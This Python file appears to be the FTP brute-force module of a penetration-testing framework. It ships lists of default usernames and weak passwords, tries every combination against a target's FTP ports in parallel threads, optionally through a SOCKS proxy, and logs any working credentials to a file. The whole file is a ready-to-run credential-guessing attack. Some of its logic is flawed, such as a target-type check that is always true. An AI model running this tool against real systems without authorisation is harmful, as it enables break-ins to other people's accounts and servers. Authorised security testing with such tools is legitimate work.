#!/usr/bin/env python
# -*- coding: utf-8 -*-

import threading
import socks
import socket
import time
import datetime
import json
import string
import random
import os
from core.alert import *
from ftplib import FTP
from core.targets import target_type
from core.targets import target_to_host
from lib.icmp.engine import do_one as do_one_ping
from lib.socks_resolver.engine import getaddrinfo


def extra_requirements_dict():
    return {
        "ftp_brute_users": ["admin", "root", "test", "ftp", "anonymous", "user", "support", "1"],
        "ftp_brute_passwds": ["admin", "root", "test", "ftp", "anonymous", "user", "1", "12345",
                              "123456", "124567", "12345678", "123456789", "1234567890", "admin1",
                              "password!@#", "support", "1qaz2wsx", "qweasd", "qwerty", "!QAZ2wsx",
                              "password1", "1qazxcvbnm", "zxcvbnm", "iloveyou", "password", "p@ssw0rd",
                              "admin123", ""],
        "ftp_brute_ports": ["21", "990"]
    }


def login(user, passwd, target, port, timeout_sec, log_in_file, language, retries, time_sleep, thread_tmp_filename,
          socks_proxy):
    _HOST = messages(language, 53)
    _USERNAME = messages(language, 54)
    _PASSWORD = messages(language, 55)
    _PORT = messages(language, 56)
    _TYPE = messages(language, 57)
    _DESCRIPTION = messages(language, 58)
    _TIME = messages(language, 115)
    exit = 0
    if socks_proxy is not None:
        socks_version = socks.SOCKS5 if socks_proxy.startswith('socks5://') else socks.SOCKS4
        socks_proxy = socks_proxy.rsplit('://')[1]
        if '@' in socks_proxy:
            socks_username = socks_proxy.rsplit(':')[0]
            socks_password = socks_proxy.rsplit(':')[1].rsplit('@')[0]
            socks.set_default_proxy(socks_version, str(socks_proxy.rsplit('@')[1].rsplit(':')[0]),
                                    int(socks_proxy.rsplit(':')[-1]), username=socks_username,
                                    password=socks_password)
            socket.socket = socks.socksocket
            socket.getaddrinfo = getaddrinfo
        else:
            socks.set_default_proxy(socks_version, str(socks_proxy.rsplit(':')[0]), int(socks_proxy.rsplit(':')[1]))
            socket.socket = socks.socksocket
            socket.getaddrinfo = getaddrinfo
    while 1:
        try:
            if timeout_sec is not None:
                my_ftp = FTP(timeout=timeout_sec)
            else:
                my_ftp = FTP()
            my_ftp.connect(target, port)
            exit = 0
            break
        except:
            exit += 1
            if exit is retries:
                warn(messages(language, 65).format(target, port, user, passwd))
                return 1
        time.sleep(time_sleep)
    flag = 1
    try:
        my_ftp.login(user, passwd)
        flag = 0
    except:
        pass
    if flag is 0:
        try:
            tmpl = []
            tmp = my_ftp.retrlines('LIST', tmpl.append)
            info(messages(language, 70).format(user, passwd, target, port))
            save = open(log_in_file, 'a')
            save.write(
                json.dumps({_HOST: target, _USERNAME: user, _PASSWORD: passwd, _PORT: port, _TYPE: 'ftp_brute',
                            _DESCRIPTION: messages(language, 66),
                            _TIME: datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}) + '\n')
            save.close()
        except:
            info(messages(language, 70).format(user, passwd, target, port) + ' ' + messages(language, 71))
            save = open(log_in_file, 'a')
            save.write(json.dumps({_HOST: target, _USERNAME: user, _PASSWORD: passwd, _PORT: port, _TYPE: 'FTP',
                                   _DESCRIPTION: messages(language, 67),
                                   _TIME: datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}) + '\n')
            save.close()
        thread_write = open(thread_tmp_filename, 'w')
        thread_write.write('0')
        thread_write.close()
    else:
        pass
    return flag


def __connect_to_port(port, timeout_sec, target, retries, language, num, total, time_sleep, ports_tmp_filename,
                      socks_proxy):
    exit = 0
    if socks_proxy is not None:
        socks_version = socks.SOCKS5 if socks_proxy.startswith('socks5://') else socks.SOCKS4
        socks_proxy = socks_proxy.rsplit('://')[1]
        if '@' in socks_proxy:
            socks_username = socks_proxy.rsplit(':')[0]
            socks_password = socks_proxy.rsplit(':')[1].rsplit('@')[0]
            socks.set_default_proxy(socks_version, str(socks_proxy.rsplit('@')[1].rsplit(':')[0]),
                                    int(socks_proxy.rsplit(':')[-1]), username=socks_username,
                                    password=socks_password)
            socket.socket = socks.socksocket
            socket.getaddrinfo = getaddrinfo
        else:
            socks.set_default_proxy(socks_version, str(socks_proxy.rsplit(':')[0]), int(socks_proxy.rsplit(':')[1]))
            socket.socket = socks.socksocket
            socket.getaddrinfo = getaddrinfo
    while 1:
        try:
            if timeout_sec is not None:
                my_ftp = FTP(timeout=timeout_sec)
            else:
                my_ftp = FTP()
            my_ftp.connect(target, int(port))
            exit = 0
            break
        except:
            exit += 1
            if exit is retries:
                error(messages(language, 68).format(target, port, str(num), str(total)))
                try:
                    f = open(ports_tmp_filename, 'a')
                    f.write(str(port) + '\n')
                    f.close()
                except:
                    pass
                break
        time.sleep(time_sleep)


def test_ports(ports, timeout_sec, target, retries, language, num, total, time_sleep, ports_tmp_filename,
               thread_number, total_req, verbose_level, socks_proxy):
    _ports = ports[:]
    threads = []
    trying = 0
    for port in _ports:
        # test ftp
        t = threading.Thread(target=__connect_to_port,
                             args=(
                                 port, timeout_sec, target, retries, language, num, total, time_sleep,
                                 ports_tmp_filename, socks_proxy))
        threads.append(t)
        t.start()
        trying += 1
        if verbose_level is not 0:
            info(messages(language, 72).format(trying, total_req, num, total, target, port))
        while 1:
            n = 0
            for thread in threads:
                if thread.isAlive() is True:
                    n += 1
                else:
                    threads.remove(thread)
            if n >= thread_number:
                time.sleep(0.01)
            else:
                break
    while 1:
        n = True
        for thread in threads:
            if thread.isAlive() is True:
                n = False
        time.sleep(0.01)
        if n is True:
            break
    _ports = list(set(open(ports_tmp_filename).read().rsplit()))
    for port in _ports:
        try:
            ports.remove(int(port))
        except:
            try:
                ports.remove(port)
            except:
                pass
    os.remove(ports_tmp_filename)
    return ports


def start(target, users, passwds, ports, timeout_sec, thread_number, num, total, log_in_file, time_sleep,
          language, verbose_level, show_version, check_update, socks_proxy, retries, ping_flag,
          methods_args):  # Main function
    if target_type(target) != 'SINGLE_IPv4' or target_type(target) != 'DOMAIN' or target_type(target) != 'HTTP':
        # requirements check
        new_extra_requirements = extra_requirements_dict()
        if methods_args is not None:
            for extra_requirement in extra_requirements_dict():
                if extra_requirement in methods_args:
                    new_extra_requirements[extra_requirement] = methods_args[extra_requirement]
        extra_requirements = new_extra_requirements
        if users is None:
            users = extra_requirements["ftp_brute_users"]
        if passwds is None:
            passwds = extra_requirements["ftp_brute_passwds"]
        if ports is None:
            ports = extra_requirements["ftp_brute_ports"]
        if target_type(target) == 'HTTP':
            target = target_to_host(target)
        if ping_flag and do_one_ping(target, timeout_sec, 8) is None:
            if socks_proxy is not None:
                socks_version = socks.SOCKS5 if socks_proxy.startswith('socks5://') else socks.SOCKS4
                socks_proxy = socks_proxy.rsplit('://')[1]
                if '@' in socks_proxy:
                    socks_username = socks_proxy.rsplit(':')[0]
                    socks_password = socks_proxy.rsplit(':')[1].rsplit('@')[0]
                    socks.set_default_proxy(socks_version, str(socks_proxy.rsplit('@')[1].rsplit(':')[0]),
                                            int(socks_proxy.rsplit(':')[-1]), username=socks_username,
                                            password=socks_password)
                    socket.socket = socks.socksocket
                    socket.getaddrinfo = getaddrinfo
                else:
                    socks.set_default_proxy(socks_version, str(socks_proxy.rsplit(':')[0]),
                                            int(socks_proxy.rsplit(':')[1]))
                    socket.socket = socks.socksocket
                    socket.getaddrinfo = getaddrinfo
            warn(messages(language, 100).format(target, 'ftp_brute'))
            return None
        threads = []
        max = thread_number
        total_req = len(users) * len(passwds) * len(ports)
        thread_tmp_filename = 'tmp/thread_tmp_' + ''.join(
            random.choice(string.ascii_letters + string.digits) for _ in range(20))
        ports_tmp_filename = 'tmp/ports_tmp_' + ''.join(
            random.choice(string.ascii_letters + string.digits) for _ in range(20))
        thread_write = open(thread_tmp_filename, 'w')
        thread_write.write('1')
        thread_write.close()
        ports_write = open(ports_tmp_filename, 'w')
        ports_write.write('')
        ports_write.close()
        trying = 0
        ports = test_ports(ports, timeout_sec, target, retries, language, num, total, time_sleep, ports_tmp_filename,
                           thread_number, total_req, verbose_level, socks_proxy)

        for port in ports:
            for user in users:
                for passwd in passwds:
                    t = threading.Thread(target=login,
                                         args=(
                                             user, passwd, target, port, timeout_sec, log_in_file, language,
                                             retries, time_sleep, thread_tmp_filename, socks_proxy))
                    threads.append(t)
                    t.start()
                    trying += 1
                    if verbose_level is not 0:
                        info(messages(language, 72).format(trying, total_req, num, total, target, port))
                    while 1:
                        n = 0
                        for thread in threads:
                            if thread.isAlive() is True:
                                n += 1
                            else:
                                threads.remove(thread)
                        if n >= max:
                            time.sleep(0.01)
                        else:
                            break

        # wait for threads
        while 1:
            n = True
            for thread in threads:
                if thread.isAlive() is True:
                    n = False
            time.sleep(0.01)
            if n is True:
                break
        thread_write = int(open(thread_tmp_filename).read().rsplit()[0])
        if thread_write is 1 and verbose_level is not 0:
            _HOST = messages(language, 53)
            _USERNAME = messages(language, 54)
            _PASSWORD = messages(language, 55)
            _PORT = messages(language, 56)
            _TYPE = messages(language, 57)
            _DESCRIPTION = messages(language, 58)
            _TIME = messages(language, 115)
            save = open(log_in_file, 'a')
            save.write(json.dumps({_HOST: target, _USERNAME: '', _PASSWORD: '', _PORT: '', _TYPE: 'ftp_brute',
                                   _DESCRIPTION: messages(language, 95),
                                   _TIME: datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}) + '\n')
            save.close()
        os.remove(thread_tmp_filename)
    else:
        warn(messages(language, 69).format('ftp_brute', target))
